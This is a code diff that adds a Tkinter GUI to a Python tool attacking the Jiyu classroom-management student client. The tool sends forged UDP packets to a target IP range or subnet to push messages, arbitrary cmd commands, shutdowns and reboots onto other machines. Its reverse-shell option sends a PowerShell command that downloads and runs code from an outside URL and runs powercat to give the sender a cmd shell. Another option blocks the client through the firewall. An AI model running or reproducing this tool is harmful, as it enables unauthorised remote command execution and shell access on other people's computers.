@@ -1,12 +1,18 @@
-import sys
-import socket
+# -*- coding: utf-8 -*-
+"""Jiyu UDP 控制台 —— GUI 版（预设命令 + 循环命令队列 + 打开软件）"""
+
+import copy
 import random
-import argparse
-from re import compile
-from time import sleep
-from struct import pack
+import socket
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from os import popen, system
-from multiprocessing import Pool
+from re import compile
+from struct import pack
+from time import sleep
+
+import tkinter as tk
+from tkinter import ttk, scrolledtext, messagebox
 
 store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7, 0x52, 0x40, 0x91, 
           0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
@@ -19,207 +25,554 @@ store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00
 
 basicCMD = {
     '-msg': store[0],
-    '-c': store[1],
-    '-r': store[2],
-    '-s': store[3],
+    '-c':   store[1],
+    '-r':   store[2],
+    '-s':   store[3],
 }
 
-header = """
-                                
-    ------------------- Github Repositories -------------------
-                        详细说明请看项目文档
-     
+PRESET_COMMANDS = [
+    ("ipconfig /all", "查看完整网络配置"),
+    ("ipconfig /flushdns", "刷新 DNS 缓存"),
+    ("whoami", "查看当前登录用户"),
+    ("hostname", "查看计算机名"),
+    ("systeminfo", "查看系统详细信息"),
+    ("tasklist", "查看运行中的进程"),
+    ("net user", "查看本机所有用户账户"),
+    ("netstat -ano", "查看所有网络连接及端口"),
+    ("ver", "查看 Windows 版本"),
+    ("dir C:\\", "列出 C 盘根目录文件"),
+    ("wmic os get caption", "查看操作系统名称"),
+    ("wmic cpu get name", "查看 CPU 型号"),
+    ("wmic logicaldisk get name", "查看所有磁盘分区"),
+    ("wmic bios get serialnumber", "查看 BIOS 序列号"),
+    ("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion", "查看系统注册表版本信息"),
+    ("shutdown /r /t 0", "立即重启计算机"),
+    ("shutdown /s /t 0", "立即关机"),
+    ("shutdown /a", "取消计划中的关机/重启"),
+    ("taskkill /f /im notepad.exe", "强制结束记事本进程"),
+    ("start notepad", "打开记事本"),
+    ("start mspaint", "打开画图"),
+    ("start calc", "打开计算器"),
+    ("start cmd", "打开命令提示符"),
+    ("start explorer", "打开资源管理器"),
+    ("start ms-settings:", "打开系统设置"),
+    ("start taskmgr", "打开任务管理器"),
+]
 
-"""
-parser = argparse.ArgumentParser(header)
-parser.add_argument('-ip', type=str, help="ip 指定目标IP地址")
-parser.add_argument('-p', type=int, default=4705, help="port 指定监听端口，默认端口为4705")
-parser.add_argument(
-    '-msg', type=str, help="send_message发送消息 eg: -msg  \"HelloWord!\"")
-parser.add_argument(
-    '-c', type=str, help="command命令 eg: -c   \"cmd.exe /c ipconfig\"")
-parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
-parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
 
-parser.add_argument('-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'], help="Extra Options加载额外的选项 eg：-e r"
-                    )
-subparsers = parser.add_subparsers(help='-e 参数的详细说明')
-subparsers.add_parser('r', help='reboot 重启')
-subparsers.add_parser('s', help='shutdown 关机')
-subparsers.add_parser('g', help='独立选项，获取当前的ip地址以及学生端监听的端口')
-subparsers.add_parser('nc', help='独立选项，反弹shell的机器需出网，退出可使用命令exit')
-subparsers.add_parser('break', help='独立选项，脱离屏幕控制，需要管理员权限')
-subparsers.add_parser('continue', help='独立选项，恢复屏幕控制')
-args = parser.parse_args()
-
-
-# 格式化要发送的消息
+# =====================================================================
+# 核心逻辑
+# =====================================================================
 def format_b4_send(content):
+    """把字符串编码为 UTF-16LE 字节序列（低字节在前）"""
     arr = []
     for ch in content:
-        tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
-        if int(tmp, 16) > 0xff:
-            tmp = tmp[2:]
-            high = int((tmp[0] + tmp[1]), 16)
-            low = int((tmp[2] + tmp[3]), 16)
-            arr.append(low)
-            arr.append(high)
-        else:
-            high = 0
-            low = int((tmp[2] + tmp[3]), 16)
-            arr.append(low)
-            arr.append(high)
+        code = ord(ch)
+        arr.append(code & 0xff)
+        arr.append((code >> 8) & 0xff)
     return arr
 
 
-# 获取ip
-def get_ip(ip):
+def parse_ips(ip):
+    """解析 IP：单 IP / x.x.x.x-y / x.x.x.0/24"""
     target_host = []
-    if ip.find('.') == -1:
-        print('\nYou enter a error IP.')
-        print("Please enter the correct format of the IP again.")
-        sys.exit(0)
-    if ip.find('-') != -1:
-        ip_arr = ip.split('-')
-        ip_arrs = ip_arr[0].split('.')
-        if int(ip_arr[1]) > 254:
-            ip_arr[1] = '254'
-        for i in range(int(ip_arrs[3]), int(ip_arr[1])+1):
-            ip_arrs[3] = str(i)
-            target_host.append('.'.join(ip_arrs))
-    elif ip.find('/') == -1:
-        target_host.append(ip)
-    elif ip.find('/24') != -1:
-        ip_arr = ip.split('/')
-        ip_arrs = ip_arr[0].split('.')
+    if '.' not in ip:
+        raise ValueError("IP 格式错误，应形如 192.168.1.10")
+
+    if '-' in ip:
+        head, tail = ip.split('-', 1)
+        parts = head.split('.')
+        if len(parts) != 4 or not tail.strip().isdigit():
+            raise ValueError("范围格式应为 192.168.1.10-50")
+        end = min(int(tail.strip()), 254)
+        start = int(parts[3])
+        if start > end:
+            raise ValueError("起始 IP 不能大于结束 IP")
+        for i in range(start, end + 1):
+            parts[3] = str(i)
+            target_host.append('.'.join(parts))
+
+    elif ip.endswith('/24'):
+        parts = ip.split('/')[0].split('.')
+        if len(parts) != 4:
+            raise ValueError("子网格式应为 192.168.1.0/24")
         for i in range(1, 255):
-            ip_arrs[3] = str(i)
-            target_host.append('.'.join(ip_arrs))
+            parts[3] = str(i)
+            target_host.append('.'.join(parts))
+
+    elif '/' not in ip:
+        target_host.append(ip)
+
     else:
-        print('\nYou enter a error IP.')
-        print("Please enter the correct format of the IP again.")
-        sys.exit(0)
+        raise ValueError("暂只支持 /24 子网")
+
     return target_host
 
 
-# 将要发送的消息打包成完整的指令
 def pkg_sendlist(cmdtype, content):
+    """把内容填入模板（深拷贝，避免污染模板）"""
     arrs = format_b4_send(content)
+
     if cmdtype == '-msg':
+        result = copy.deepcopy(basicCMD['-msg'])
         index = 56
-        result = basicCMD['-msg']
-        for elem in arrs:
-            result[index] = elem
-            index += 1
     elif cmdtype == '-c':
+        result = copy.deepcopy(basicCMD['-c'])
         index = 578
-        result = basicCMD['-c']
-        for elem in arrs:
-            result[index] = elem
-            index += 1
+    else:
+        return None
+
+    for elem in arrs:
+        if index >= len(result):
+            break
+        result[index] = elem
+        index += 1
     return result
 
 
-# 发送
-def send(send_list):
-    if len(send_list) == 0:
-        print("[-] error 请使用 -h 以获取命令帮助")
-        sys.exit(0)
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    target_host = get_ip(args.ip)
-    for times in range(args.l):
-        for i in target_host:
-            for abc in send_list:
-                payload = pack("%dB" % (len(abc)), *abc)
-                client.sendto(payload, (i, args.p))
-        if args.l == 1:
-            print("发送成功")
-            sys.exit(0)
-        print("第%s次执行完毕" % str(times + 1))
-        if times != args.l - 1:
-            sleep(args.t)
+def _send_one_round(targets, port, payloads):
+    """向所有目标并发发送一组 payload"""
+    def send_to_ip(ip):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            for abc in payloads:
+                payload = pack("%dB" % len(abc), *abc)
+                sock.sendto(payload, (ip, port))
+        finally:
+            sock.close()
+
+    workers = min(max(len(targets), 1), 50)
+    with ThreadPoolExecutor(max_workers=workers) as ex:
+        futures = [ex.submit(send_to_ip, ip) for ip in targets]
+        for f in as_completed(futures):
+            f.result()
 
 
-def creat_send_object():
-    send_list = []
-
-    # 获取命令内容
-    if args.msg:
-        send_list.append(pkg_sendlist('-msg', args.msg))
-
-    if args.c:
-        send_list.append(pkg_sendlist('-c', args.c))
-
-    if args.e == 'r':
-        send_list.append(basicCMD['-r'])
-
-    if args.e == 's':
-        send_list.append(basicCMD['-s'])
-
-    return send_list
+def _interruptible_sleep(seconds, stop_event):
+    """可被 stop_event 打断的睡眠"""
+    total = int(seconds * 10)
+    for _ in range(total):
+        if stop_event.is_set():
+            return False
+        sleep(0.1)
+    return True
 
 
-def single_command():
-    if args.e == 'g':
+def run_send(targets, port, msg, cmd_queue, loop,
+             cmd_interval, round_interval, log, stop_event):
+    """循环发送：每轮先发消息，然后按队列顺序发送命令"""
+    total_targets = len(targets)
+    log("目标数量：%d，端口：%d" % (total_targets, port))
+    log("循环 %d 轮，命令 %d 条，命令间隔 %ss，轮次间隔 %ss"
+        % (loop, len(cmd_queue), cmd_interval, round_interval))
+    log("-" * 60)
+
+    for r in range(loop):
+        if stop_event.is_set():
+            log("已停止发送")
+            return
+
+        # 1. 每轮开头发消息
+        if msg:
+            payloads = [pkg_sendlist('-msg', msg)]
+            _send_one_round(targets, port, payloads)
+            log("[第 %d/%d 轮] 消息已发送：%s" % (r + 1, loop, msg[:60]))
+
+        # 2. 依次发送队列中的命令
+        for i, cmd in enumerate(cmd_queue):
+            if stop_event.is_set():
+                log("已停止发送")
+                return
+
+            payloads = [pkg_sendlist('-c', cmd)]
+            _send_one_round(targets, port, payloads)
+            log("[第 %d/%d 轮] 命令 %d/%d 已发送：%s"
+                % (r + 1, loop, i + 1, len(cmd_queue), cmd[:60]))
+
+            if i != len(cmd_queue) - 1 and cmd_interval > 0:
+                if not _interruptible_sleep(cmd_interval, stop_event):
+                    log("已停止发送")
+                    return
+
+        # 3. 轮次间隔
+        if r != loop - 1 and round_interval > 0:
+            log("第 %d/%d 轮完成，等待 %.1fs ..." % (r + 1, loop, round_interval))
+            if not _interruptible_sleep(round_interval, stop_event):
+                log("已停止发送")
+                return
+
+    log("=" * 60)
+    log("全部发送完成 ✔")
+
+
+# =====================================================================
+# 图形界面
+# =====================================================================
+class JiyuGUI:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Jiyu UDP 控制台（预设 + 循环队列 + 打开软件）")
+        self.root.geometry("840x820")
+
+        self.stop_event = threading.Event()
+        self.busy = False
+        self.cmd_queue = []
+
+        self._build_ui()
+        self.log("就绪。目标 IP 支持：单 IP / x.x.x.x-y / x.x.x.0/24")
+
+    # ------------------------- 界面构建 -------------------------
+    def _build_ui(self):
+        pad = {'padx': 6, 'pady': 4}
+
+        # ---------- 目标设置 ----------
+        frm = ttk.LabelFrame(self.root, text="目标设置")
+        frm.pack(fill='x', padx=10, pady=6)
+
+        ttk.Label(frm, text="目标 IP：").grid(row=0, column=0, sticky='e', **pad)
+        self.ip_var = tk.StringVar(value="192.168.152.0/24")
+        ttk.Entry(frm, textvariable=self.ip_var, width=26).grid(row=0, column=1, sticky='w', **pad)
+        ttk.Label(frm, text="单IP / x.x.x.x-y / x.x.x.0/24",
+                  foreground='gray').grid(row=0, column=2, columnspan=2, sticky='w')
+
+        ttk.Label(frm, text="目标端口：").grid(row=1, column=0, sticky='e', **pad)
+        self.port_var = tk.StringVar(value="4705")
+        ttk.Entry(frm, textvariable=self.port_var, width=10).grid(row=1, column=1, sticky='w', **pad)
+
+        ttk.Label(frm, text="循环轮数：").grid(row=2, column=0, sticky='e', **pad)
+        self.loop_var = tk.StringVar(value="1")
+        ttk.Entry(frm, textvariable=self.loop_var, width=10).grid(row=2, column=1, sticky='w', **pad)
+
+        ttk.Label(frm, text="命令间隔(秒)：").grid(row=3, column=0, sticky='e', **pad)
+        self.cmd_int_var = tk.StringVar(value="2")
+        ttk.Entry(frm, textvariable=self.cmd_int_var, width=10).grid(row=3, column=1, sticky='w', **pad)
+
+        ttk.Label(frm, text="轮次间隔(秒)：").grid(row=4, column=0, sticky='e', **pad)
+        self.round_int_var = tk.StringVar(value="22")
+        ttk.Entry(frm, textvariable=self.round_int_var, width=10).grid(row=4, column=1, sticky='w', **pad)
+
+        # ---------- 指令内容 ----------
+        frm2 = ttk.LabelFrame(self.root, text="指令内容")
+        frm2.pack(fill='x', padx=10, pady=6)
+
+        ttk.Label(frm2, text="消息 (-msg)：").grid(row=0, column=0, sticky='ne', **pad)
+        self.msg_text = tk.Text(frm2, height=2, width=68)
+        self.msg_text.grid(row=0, column=1, columnspan=2, sticky='we', **pad)
+
+        ttk.Label(frm2, text="命令 (-c)：").grid(row=1, column=0, sticky='ne', **pad)
+        self.cmd_text = tk.Text(frm2, height=2, width=52)
+        self.cmd_text.grid(row=1, column=1, sticky='we', **pad)
+
+        # 预设命令下拉（显示：命令 —— 中文说明）
+        preset_frame = ttk.Frame(frm2)
+        preset_frame.grid(row=2, column=0, columnspan=3, sticky='we', **pad)
+
+        ttk.Label(preset_frame, text="预设命令：").pack(side='left', padx=(0, 4))
+        self.preset_var = tk.StringVar()
+        self.preset_box = ttk.Combobox(
+            preset_frame, textvariable=self.preset_var,
+            values=["%s  ——  %s" % (c, d) for c, d in PRESET_COMMANDS],
+            state='readonly', width=52)
+        self.preset_box.pack(side='left', padx=2)
+        self.preset_box.bind('<<ComboboxSelected>>', self.on_preset_selected)
+
+        ttk.Button(preset_frame, text="填入命令框",
+                   command=self.on_preset_selected).pack(side='left', padx=4)
+        ttk.Button(preset_frame, text="直接加入队列",
+                   command=self.on_preset_to_queue).pack(side='left', padx=4)
+
+        # 打开软件
+        open_frame = ttk.Frame(frm2)
+        open_frame.grid(row=3, column=0, columnspan=3, sticky='we', **pad)
+
+        ttk.Label(open_frame, text="打开软件：").pack(side='left', padx=(0, 4))
+        self.open_var = tk.StringVar()
+        ttk.Entry(open_frame, textvariable=self.open_var, width=32).pack(side='left', padx=2)
+        ttk.Label(open_frame, text="（如 notepad / C:\\xx\\yy.exe）",
+                  foreground='gray').pack(side='left', padx=2)
+        ttk.Button(open_frame, text="加入队列",
+                   command=self.on_open_software).pack(side='left', padx=4)
+
+        # 队列操作
+        queue_frame = ttk.Frame(frm2)
+        queue_frame.grid(row=4, column=0, columnspan=3, sticky='we', **pad)
+
+        ttk.Button(queue_frame, text="＋ 添加当前命令到队列",
+                   command=self.on_add_cmd_to_queue).pack(side='left', padx=2)
+        ttk.Button(queue_frame, text="－ 删除选中",
+                   command=self.on_del_queue_item).pack(side='left', padx=2)
+        ttk.Button(queue_frame, text="清空队列",
+                   command=self.on_clear_queue).pack(side='left', padx=2)
+
+        # 队列列表
+        list_frame = ttk.LabelFrame(frm2, text="循环命令队列（每轮按顺序执行）")
+        list_frame.grid(row=5, column=0, columnspan=3, sticky='we', padx=6, pady=4)
+
+        self.queue_listbox = tk.Listbox(list_frame, height=6, activestyle='dotbox')
+        self.queue_listbox.pack(side='left', fill='both', expand=True, padx=4, pady=4)
+
+        scroll = ttk.Scrollbar(list_frame, orient='vertical',
+                               command=self.queue_listbox.yview)
+        scroll.pack(side='right', fill='y', pady=4)
+        self.queue_listbox.configure(yscrollcommand=scroll.set)
+
+        self.queue_listbox.bind('<Double-Button-1>', self.on_queue_double_click)
+
+        # ---------- 操作 ----------
+        frm3 = ttk.LabelFrame(self.root, text="操作")
+        frm3.pack(fill='x', padx=10, pady=6)
+
+        ttk.Label(frm3, text="额外选项：").pack(side='left', padx=(6, 2), pady=6)
+        self.action_var = tk.StringVar(value='无')
+        actions = ['无', '重启(r)', '关机(s)', '获取信息(g)',
+                   '反弹Shell(nc)', '脱离控制(break)', '恢复控制(continue)']
+        ttk.Combobox(frm3, textvariable=self.action_var, values=actions,
+                     state='readonly', width=18).pack(side='left', padx=2, pady=6)
+
+        self.exec_btn = ttk.Button(frm3, text="▶ 执行", command=self.on_execute)
+        self.exec_btn.pack(side='left', padx=8, pady=6)
+
+        self.stop_btn = ttk.Button(frm3, text="■ 停止",
+                                   command=self.on_stop, state='disabled')
+        self.stop_btn.pack(side='left', padx=4, pady=6)
+
+        ttk.Button(frm3, text="清空日志",
+                   command=self.clear_log).pack(side='left', padx=4, pady=6)
+
+        # ---------- 日志 ----------
+        frm4 = ttk.LabelFrame(self.root, text="日志")
+        frm4.pack(fill='both', expand=True, padx=10, pady=6)
+        self.txt = scrolledtext.ScrolledText(frm4, height=12, state='disabled')
+        self.txt.pack(fill='both', expand=True, padx=6, pady=6)
+
+    # ------------------------- 工具方法 -------------------------
+    def log(self, msg):
+        def _append():
+            self.txt.configure(state='normal')
+            self.txt.insert('end', msg + '\n')
+            self.txt.see('end')
+            self.txt.configure(state='disabled')
+        self.root.after(0, _append)
+
+    def clear_log(self):
+        self.txt.configure(state='normal')
+        self.txt.delete('1.0', 'end')
+        self.txt.configure(state='disabled')
+
+    def start(self, fn):
+        if self.busy:
+            messagebox.showinfo("提示", "任务正在执行中，请先停止或等待完成")
+            return
+        self.busy = True
+        self.stop_event.clear()
+        self.exec_btn.configure(state='disabled')
+        self.stop_btn.configure(state='normal')
+
+        def wrapper():
+            try:
+                fn()
+            except Exception as e:
+                self.log("[-] 出错：%s" % e)
+            finally:
+                self.busy = False
+                self.root.after(0, lambda: (
+                    self.exec_btn.configure(state='normal'),
+                    self.stop_btn.configure(state='disabled')
+                ))
+
+        threading.Thread(target=wrapper, daemon=True).start()
+
+    def on_stop(self):
+        self.stop_event.set()
+        self.log("已请求停止…")
+
+    # ------------------------- 队列相关 -------------------------
+    def _refresh_queue_view(self):
+        self.queue_listbox.delete(0, 'end')
+        for i, cmd in enumerate(self.cmd_queue, 1):
+            self.queue_listbox.insert('end', "%d. %s" % (i, cmd))
+
+    def _parse_preset(self, s):
+        """从 '命令  ——  中文说明' 中还原出命令部分"""
+        if not s:
+            return None
+        return s.split('  ——  ')[0].strip()
+
+    def on_preset_selected(self, event=None):
+        """把下拉框选中的预设命令填入命令输入框"""
+        cmd = self._parse_preset(self.preset_var.get())
+        if not cmd:
+            return
+        self.cmd_text.delete('1.0', 'end')
+        self.cmd_text.insert('1.0', cmd)
+
+    def on_preset_to_queue(self):
+        """把下拉框选中的预设命令直接加入队列"""
+        cmd = self._parse_preset(self.preset_var.get())
+        if not cmd:
+            return
+        self.cmd_queue.append(cmd)
+        self._refresh_queue_view()
+
+    def on_open_software(self):
+        """根据输入生成 start 命令并加入队列"""
+        target = self.open_var.get().strip()
+        if not target:
+            messagebox.showwarning("提示", "请输入要打开的程序名或路径")
+            return
+        cmd = 'start "" "%s"' % target
+        self.cmd_queue.append(cmd)
+        self._refresh_queue_view()
+        self.log("已加入队列：%s" % cmd)
+
+    def on_add_cmd_to_queue(self):
+        """把命令输入框的内容加入队列（支持多行，每行一条）"""
+        text = self.cmd_text.get('1.0', 'end').strip()
+        if not text:
+            messagebox.showwarning("提示", "命令框为空")
+            return
+        for line in text.splitlines():
+            line = line.strip()
+            if line:
+                self.cmd_queue.append(line)
+        self._refresh_queue_view()
+
+    def on_del_queue_item(self):
+        sel = self.queue_listbox.curselection()
+        if not sel:
+            return
+        idx = sel[0]
+        del self.cmd_queue[idx]
+        self._refresh_queue_view()
+
+    def on_clear_queue(self):
+        if self.cmd_queue and messagebox.askyesno("确认", "清空整个循环队列？"):
+            self.cmd_queue.clear()
+            self._refresh_queue_view()
+
+    def on_queue_double_click(self, event):
+        """双击队列项，把该命令放回命令输入框"""
+        sel = self.queue_listbox.curselection()
+        if not sel:
+            return
+        cmd = self.cmd_queue[sel[0]]
+        self.cmd_text.delete('1.0', 'end')
+        self.cmd_text.insert('1.0', cmd)
+
+    # ------------------------- 主逻辑 -------------------------
+    def on_execute(self):
+        ip = self.ip_var.get().strip()
+        try:
+            port = int(self.port_var.get())
+            loop = int(self.loop_var.get())
+            cmd_interval = float(self.cmd_int_var.get())
+            round_interval = float(self.round_int_var.get())
+        except ValueError:
+            messagebox.showerror("参数错误", "端口 / 循环轮数 / 间隔必须是数字")
+            return
+
+        if loop < 1:
+            messagebox.showerror("参数错误", "循环轮数至少为 1")
+            return
+
+        try:
+            targets = parse_ips(ip)
+        except ValueError as e:
+            messagebox.showerror("IP 错误", str(e))
+            return
+
+        action = self.action_var.get()
+        msg = self.msg_text.get('1.0', 'end').strip()
+        cmd = self.cmd_text.get('1.0', 'end').strip()
+
+        # ---- 独立选项 ----
+        if action == '获取信息(g)':
+            self.start(self.job_getinfo)
+            return
+        if action == '脱离控制(break)':
+            self.start(self.job_break)
+            return
+        if action == '恢复控制(continue)':
+            self.start(self.job_continue)
+            return
+        if action == '反弹Shell(nc)':
+            self.start(lambda: self.job_nc(targets, port))
+            return
+
+        # ---- 重启 / 关机 ----
+        if action in ('重启(r)', '关机(s)'):
+            key = '-r' if action == '重启(r)' else '-s'
+            payloads = [copy.deepcopy(basicCMD[key])]
+            self.start(lambda: (self.log("执行：%s" % action),
+                                _send_one_round(targets, port, payloads),
+                                self.log("完成 ✔")))
+            return
+
+        # ---- 组装命令队列 ----
+        queue = list(self.cmd_queue)
+        if not queue and cmd:
+            queue.append(cmd)
+
+        if not queue and not msg:
+            messagebox.showwarning("提示", "请至少填写「消息」或「命令/队列」")
+            return
+
+        self.start(lambda: run_send(
+            targets, port, msg, queue, loop,
+            cmd_interval, round_interval, self.log, self.stop_event))
+
+    # ------------------------- 子任务 -------------------------
+    def job_getinfo(self):
         try:
             hostname = socket.gethostname()
             ip = socket.gethostbyname(hostname)
-            print("\nYour ip addres is:" + ip)
+            self.log("本机 IP：%s" % ip)
 
-            tasklist = popen("tasklist|find \"Student\"").read()
+            tasklist = popen('tasklist|find "Student"').read()
             pattern = compile(r'[e]\s*\d{1,5}\s*[C]')
             pid = (pattern.search(tasklist).group()[1:-1]).strip()
 
-            netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
+            netstat = popen('netstat -ano |find "%s"' % pid).read()
             pattern = compile(r"%s:\d{1,5}\s*[*]{1}" % ip)
             netstat_pat = pattern.findall(netstat)
 
             ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
-            print("\nYour student client possible ports are:" + ','.join(ports))
-        except:
-            pass
-        sys.exit(0)
+            self.log("学生端可能监听的端口：%s" % ','.join(ports))
+        except Exception:
+            self.log("[-] 未找到 Student 进程或获取信息失败")
 
-    elif args.e == 'break':
+    def job_break(self):
         popen('sc config MpsSvc start= auto')
         popen('net start MpsSvc')
         popen('netsh advfirewall set allprofiles state on')
         popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')
         sleep(1)
-        system("cls")
-        sys.exit(0)
+        self.log("已启用防火墙并阻断 StudentMain.exe（脱离控制）")
 
-    elif args.e == 'continue':
+    def job_continue(self):
         popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
-        sys.exit(0)
+        self.log("已恢复 StudentMain.exe 网络（恢复控制）")
 
+    def job_nc(self, targets, port):
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        listen_port = random.randint(1024, 65535)
 
-def netcat(num):
-    send_list = []
-    hostname = socket.gethostname()
-    ip = socket.gethostbyname(hostname)
-    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(ip, num)
-    send_list.append(pkg_sendlist('-c', cmd))
-    send(send_list)
+        cmd = ("powershell IEX (New-Object System.Net.Webclient)"
+               ".DownloadString('https://xss.pt/hYvg');"
+               "powercat -c {} -p {} -e cmd").format(local_ip, listen_port)
 
+        send_list = [pkg_sendlist('-c', cmd)]
+        self.log("本机 IP：%s，监听端口：%d" % (local_ip, listen_port))
 
-def run_from_cmd():
-    try:
-        single_command()
-        if args.e != 'nc':
-            send_list = creat_send_object()
-            send(send_list)
-            sys.exit(0)
-        num = random.randint(1, 65535)
-        pool = Pool(processes=1)
-        pool.apply_async(netcat, (num,))
-        print("listening on [any] {} ...".format(num))
-        system("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(num))
-        pool.close()
-        pool.join()
-    except Exception as e:
-        print("[-] %s" % e)
+        _send_one_round(targets, port, send_list)
+        self.log("开始监听 %d ..." % listen_port)
+        system("powershell IEX (New-Object System.Net.Webclient)"
+               ".DownloadString('https://xss.pt/hYvg');"
+               "powercat -l -p {}".format(listen_port))
 
 
 if __name__ == '__main__':
-    run_from_cmd()
+    root = tk.Tk()
+    app = JiyuGUI(root)
+    root.mainloop()
